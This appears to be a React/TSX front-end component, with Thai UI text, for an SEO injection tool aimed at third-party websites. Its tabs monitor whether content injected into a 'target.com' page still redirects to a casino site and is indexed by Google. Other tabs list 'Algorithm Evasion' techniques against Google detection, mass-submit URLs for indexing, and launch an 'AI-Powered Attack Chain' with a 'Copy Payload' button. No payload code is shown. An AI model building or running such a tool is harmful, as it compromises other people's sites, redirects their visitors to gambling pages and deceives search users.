                          </div>
                        </ScrollArea>
                      </div>
                    ))}
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ INJECTION MONITOR ═══════════ */}
        <TabsContent value="monitor" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Eye className="h-4 w-4 text-cyan-400" /> Injection Status Monitor
              </CardTitle>
              <CardDescription>ตรวจสอบว่า injection ยังทำงานอยู่หรือถูกลบ + ตรวจ Google Index</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4 md:grid-cols-2">
                <div>
                  <Label className="text-xs text-gray-400">Injected URL</Label>
                  <Input value={monitorUrl} onChange={(e) => setMonitorUrl(e.target.value)}
                    placeholder="https://target.com/page.html" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Expected Redirect URL</Label>
                  <Input value={monitorRedirectUrl} onChange={(e) => setMonitorRedirectUrl(e.target.value)}
                    placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
              </div>

              <Button onClick={() => {
                if (!monitorUrl.trim()) return toast.error("ใส่ URL ที่จะตรวจสอบ");
                if (!monitorRedirectUrl.trim()) return toast.error("ใส่ redirect URL");
                checkInjectionMut.mutate({
                  url: monitorUrl.trim(),
                  contentHash: "",
                  redirectUrl: monitorRedirectUrl.trim(),
                });
              }} disabled={isRunning} className="bg-cyan-600 hover:bg-cyan-700">
                {checkInjectionMut.isPending
                  ? <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Checking...</>
                  : <><Eye className="h-4 w-4 mr-2" /> Check Injection Status</>}
              </Button>

              {checkInjectionMut.data && (
                <Card className={`border-gray-800 ${
                  checkInjectionMut.data.status === "active" ? "border-green-500/20 bg-green-950/10" :
                  checkInjectionMut.data.status === "cleaned" ? "border-red-500/20 bg-red-950/10" :
                  "border-yellow-500/20 bg-yellow-950/10"
                }`}>
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Status</p>
                        <div className="flex items-center justify-center gap-1 mt-1">
                          {checkInjectionMut.data.status === "active"
                            ? <CheckCircle2 className="h-4 w-4 text-green-400" />
                            : checkInjectionMut.data.status === "cleaned"
                            ? <XCircle className="h-4 w-4 text-red-400" />
                            : <AlertTriangle className="h-4 w-4 text-yellow-400" />}
                          <span className={`text-sm font-bold ${
                            checkInjectionMut.data.status === "active" ? "text-green-400" :
                            checkInjectionMut.data.status === "cleaned" ? "text-red-400" : "text-yellow-400"
                          }`}>
                            {checkInjectionMut.data.status.toUpperCase()}
                          </span>
                        </div>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Google Indexed</p>
                        <p className={`text-sm font-bold mt-1 ${checkInjectionMut.data.indexedByGoogle ? "text-green-400" : "text-gray-500"}`}>
                          {checkInjectionMut.data.indexedByGoogle ? "YES" : "NO"}
                        </p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Content Hash</p>
                        <p className="text-xs font-mono text-white mt-1 truncate">{checkInjectionMut.data.contentHash?.slice(0, 12) || "N/A"}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Redirect Working</p>
                        <p className={`text-sm font-bold mt-1 ${checkInjectionMut.data.redirectWorking ? "text-green-400" : "text-red-400"}`}>
                          {checkInjectionMut.data.redirectWorking ? "YES" : "NO"}
                        </p>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ ALGORITHM EVASION ═══════════ */}
        <TabsContent value="evasion" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Shield className="h-4 w-4 text-orange-400" /> Algorithm Evasion Techniques
              </CardTitle>
              <CardDescription>เทคนิคหลบ Google algorithm + anti-detection patterns</CardDescription>
            </CardHeader>
            <CardContent>
              <ScrollArea className="max-h-[500px]">
                <div className="space-y-2">
                  {evasionQuery.data?.techniques?.map((tech: any, i: number) => (
                    <div key={i} className="p-3 rounded-lg bg-gray-800/30 border border-gray-700/30 hover:border-orange-500/20 transition-colors">
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center gap-2">
                          <h3 className="text-xs font-medium text-white">{tech.technique}</h3>
                          <Badge variant="outline" className="text-[8px]">{tech.category}</Badge>
                        </div>
                        <div className="flex items-center gap-1">
                          <span className="text-[10px] text-gray-500">Effectiveness:</span>
                          <div className="w-16 h-1.5 rounded-full bg-gray-700 overflow-hidden">
                            <div className={`h-full rounded-full ${
                              tech.effectiveness > 80 ? "bg-green-400" :
                              tech.effectiveness > 50 ? "bg-yellow-400" : "bg-red-400"
                            }`} style={{ width: `${tech.effectiveness}%` }} />
                          </div>
                          <span className="text-[10px] text-gray-400">{tech.effectiveness}%</span>
                        </div>
                      </div>
                      <p className="text-[10px] text-gray-400">{tech.description}</p>
                      {tech.code && (
                        <pre className="text-[9px] text-orange-400/70 bg-black/30 rounded p-1.5 mt-1.5 overflow-x-auto max-h-[60px] font-mono">
                          {tech.code.slice(0, 200)}{tech.code.length > 200 ? "..." : ""}
                        </pre>
                      )}
                    </div>
                  )) || (
                    <div className="text-center py-8 text-gray-500 text-xs">Loading techniques...</div>
                  )}
                </div>
              </ScrollArea>

              {evasionQuery.data && (
                <div className="flex items-center gap-4 text-[10px] text-gray-500 pt-3 border-t border-gray-800 mt-3">
                  <span>{evasionQuery.data.total} techniques</span>
                  <span>Avg effectiveness: {evasionQuery.data.avgEffectiveness}%</span>
                  <span>Categories: {evasionQuery.data.categories?.join(", ")}</span>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ MASS INDEXING ═══════════ */}
        <TabsContent value="indexing" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Globe className="h-4 w-4 text-green-400" /> Mass Indexing Engine
              </CardTitle>
              <CardDescription>ดัน URL เข้า Google Index ผ่าน API + Ping + Sitemap</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label className="text-xs text-gray-400">URLs to Index (one per line, max 100)</Label>
                <textarea value={indexUrls} onChange={(e) => setIndexUrls(e.target.value)}
                  placeholder="https://target.com/page1.html&#10;https://target.com/page2.html" rows={5}
                  className="w-full rounded-md bg-gray-800/50 border border-gray-700 text-sm px-3 py-2 text-gray-200 placeholder:text-gray-600 mt-1 font-mono" />
              </div>

              <div className="flex items-center gap-3">
                <Label className="text-xs text-gray-400">Method:</Label>
                {(["all", "api", "ping", "sitemap"] as const).map(method => (
                  <button key={method} onClick={() => setIndexMethod(method)}
                    className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all capitalize ${
                      indexMethod === method
                        ? "bg-green-600 text-white ring-1 ring-green-400"
                        : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                    }`}>
                    {method}
                  </button>
                ))}
              </div>

              <Button onClick={() => {
                const urls = indexUrls.split("\n").map(u => u.trim()).filter(Boolean);
                if (urls.length === 0) return toast.error("ใส่ URLs ที่จะ index");
                if (urls.length > 100) return toast.error("สูงสุด 100 URLs");
                massIndexMut.mutate({ urls, method: indexMethod });
              }} disabled={isRunning} className="bg-green-600 hover:bg-green-700">
                {massIndexMut.isPending
                  ? <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Indexing...</>
                  : <><Globe className="h-4 w-4 mr-2" /> Submit for Indexing</>}
              </Button>

              {massIndexMut.data && (
                <Card className="border-green-500/20 bg-green-950/10">
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-3 gap-3">
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Total URLs</p>
                        <p className="text-xl font-bold text-white">{massIndexMut.data.submitted + massIndexMut.data.failed}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Submitted</p>
                        <p className="text-xl font-bold text-green-400">{massIndexMut.data.submitted}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Failed</p>
                        <p className="text-xl font-bold text-red-400">{massIndexMut.data.failed}</p>
                      </div>
                    </div>
                    {massIndexMut.data.results && (
                      <ScrollArea className="max-h-[200px] mt-3">
                        <div className="space-y-1">
                          {massIndexMut.data.results.map((r: any, i: number) => (
                            <div key={i} className="flex items-center gap-2 text-[10px] p-1.5 rounded bg-gray-800/30">
                              {r.success
                                ? <CheckCircle2 className="h-3 w-3 text-green-400 shrink-0" />
                                : <XCircle className="h-3 w-3 text-red-400 shrink-0" />}
                              <span className="text-gray-400 truncate flex-1">{r.url}</span>
                              <Badge variant="outline" className="text-[8px]">{r.method}</Badge>
                            </div>
                          ))}
                        </div>
                      </ScrollArea>
                    )}
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ V2 FULL ATTACK CHAIN ═══════════ */}
        <TabsContent value="v2chain" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-lg flex items-center gap-2">
                <Rocket className="h-5 w-5 text-red-400" /> V2 AI-Powered Attack Chain
              </CardTitle>
              <CardDescription>
                Full pipeline: AI Content + Keyword Intelligence + Link Wheel + Algorithm Evasion + Mass Indexing
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4 md:grid-cols-2">
                <div>
                  <Label className="text-xs text-gray-400">Target Domain</Label>
                  <Input value={v2Target} onChange={(e) => setV2Target(e.target.value)}
                    placeholder="target.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Redirect URL</Label>
                  <Input value={v2RedirectUrl} onChange={(e) => setV2RedirectUrl(e.target.value)}
                    placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
              </div>

              <div className="grid gap-4 md:grid-cols-3">
                <div>
                  <Label className="text-xs text-gray-400">Keywords (comma separated, optional)</Label>
                  <Input value={v2Keywords} onChange={(e) => setV2Keywords(e.target.value)}
                    placeholder="casino, slots, betting" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Language</Label>
                  <div className="flex gap-2 mt-1">
                    {(["th", "en"] as const).map(lang => (
                      <button key={lang} onClick={() => setV2Language(lang)}
                        className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                          v2Language === lang
                            ? "bg-red-600 text-white ring-1 ring-red-400"
                            : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                        }`}>
                        {lang === "th" ? "ไทย" : "English"}
                      </button>
                    ))}
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <Switch checked={v2EnableBacklinks} onCheckedChange={setV2EnableBacklinks} />
                    <Label className="text-xs text-gray-400">Enable Backlinks</Label>
                  </div>
                  <div className="flex items-center gap-2">
                    <Switch checked={v2EnableIndexing} onCheckedChange={setV2EnableIndexing} />
                    <Label className="text-xs text-gray-400">Enable Mass Indexing</Label>
                  </div>
                </div>
              </div>

              {/* Attack Chain Steps Visualization */}
              <div className="p-4 rounded-lg bg-gradient-to-r from-red-950/20 via-violet-950/20 to-blue-950/20 border border-red-500/20">
                <p className="text-xs text-gray-400 mb-3">V2 Attack Pipeline:</p>
                <div className="flex flex-wrap items-center gap-2">
                  {[
                    { label: "Keyword Intel", icon: Search, color: "text-amber-400" },
                    { label: "AI Content", icon: Brain, color: "text-violet-400" },
                    { label: "Link Wheel", icon: Network, color: "text-blue-400" },
                    { label: "Evasion Wrap", icon: Shield, color: "text-orange-400" },
                    { label: "Mass Index", icon: Globe, color: "text-green-400" },
                  ].map((step, i) => (
                    <div key={i} className="flex items-center gap-2">
                      <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-gray-800/50 border border-gray-700/50">
                        <step.icon className={`h-3.5 w-3.5 ${step.color}`} />
                        <span className="text-[10px] text-gray-300">{step.label}</span>
                      </div>
                      {i < 4 && <ArrowRight className="h-3 w-3 text-gray-600" />}
                    </div>
                  ))}
                </div>
              </div>

              <Button onClick={() => {
                if (!v2Target.trim()) return toast.error("ใส่ target domain");
                if (!v2RedirectUrl.trim()) return toast.error("ใส่ redirect URL");
                const keywords = v2Keywords.split(",").map(k => k.trim()).filter(Boolean);
                runV2ChainMut.mutate({
                  targetDomain: v2Target.trim(),
                  redirectUrl: v2RedirectUrl.trim(),
                  keywords: keywords.length > 0 ? keywords : undefined,
                  language: v2Language,
                  enableBacklinks: v2EnableBacklinks,
                  enableIndexing: v2EnableIndexing,
                  backlinkTiers: 3,
                });
              }} disabled={isRunning}
                className="w-full bg-gradient-to-r from-red-600 via-violet-600 to-blue-600 hover:from-red-700 hover:via-violet-700 hover:to-blue-700 text-white font-bold text-lg py-6 shadow-lg shadow-red-500/25">
                {runV2ChainMut.isPending
                  ? <><Loader2 className="h-5 w-5 animate-spin mr-2" /> Running V2 Chain...</>
                  : <><Rocket className="h-5 w-5 mr-2" /> Launch V2 Attack Chain</>}
              </Button>

              {/* V2 Chain Results */}
              {runV2ChainMut.data && (
                <Card className="border-red-500/20 bg-red-950/10">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-sm flex items-center gap-2">
                      <CheckCircle2 className="h-4 w-4 text-green-400" /> V2 Chain Complete
                      <Badge variant="outline" className="text-[10px]">
                        {(runV2ChainMut.data.elapsed / 1000).toFixed(1)}s
                      </Badge>
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Campaign ID</p>
                        <p className="text-xs text-white mt-1 font-mono">{runV2ChainMut.data.campaignId}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Keywords</p>
                        <p className="text-xl font-bold text-amber-400">{runV2ChainMut.data.keywords?.length || 0}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Content Words</p>
                        <p className="text-xl font-bold text-violet-400">{runV2ChainMut.data.content?.wordCount || 0}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50 text-center">
                        <p className="text-[10px] text-gray-500 uppercase">Backlinks</p>
                        <p className="text-xl font-bold text-blue-400">{runV2ChainMut.data.linkWheel?.totalLinks || 0}</p>
                      </div>
                    </div>

                    {/* Content Preview */}
                    {runV2ChainMut.data.content && (
                      <div className="p-3 rounded-lg bg-gray-800/30 border border-gray-700/30">
                        <p className="text-[10px] text-gray-500 uppercase mb-1">Generated Content</p>
                        <p className="text-xs text-white font-medium">{runV2ChainMut.data.content.title}</p>
                        <p className="text-[10px] text-gray-400 mt-1">{runV2ChainMut.data.content.metaDescription}</p>
                      </div>
                    )}

                    {/* Evasion Techniques */}
                    {runV2ChainMut.data.evasionTechniques && (
                      <div className="flex flex-wrap gap-1">
                        <span className="text-[10px] text-gray-500">Evasion:</span>
                        {runV2ChainMut.data.evasionTechniques.map((t: string, i: number) => (
                          <Badge key={i} variant="outline" className="text-[8px] text-orange-300 border-orange-500/30">{t}</Badge>
                        ))}
                      </div>
                    )}

                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={() => {
                        const blob = new Blob([JSON.stringify(runV2ChainMut.data, null, 2)], { type: "application/json" });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement("a"); a.href = url; a.download = `v2-chain-${runV2ChainMut.data.campaignId}.json`; a.click();
                      }} className="text-xs border-gray-700">
                        <Download className="h-3 w-3 mr-1" /> Download Report
                      </Button>
                      <Button variant="outline" size="sm" onClick={() => copyToClipboard(runV2ChainMut.data.injectionPayload || "")}
                        className="text-xs border-gray-700">
                        <Copy className="h-3 w-3 mr-1" /> Copy Payload
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
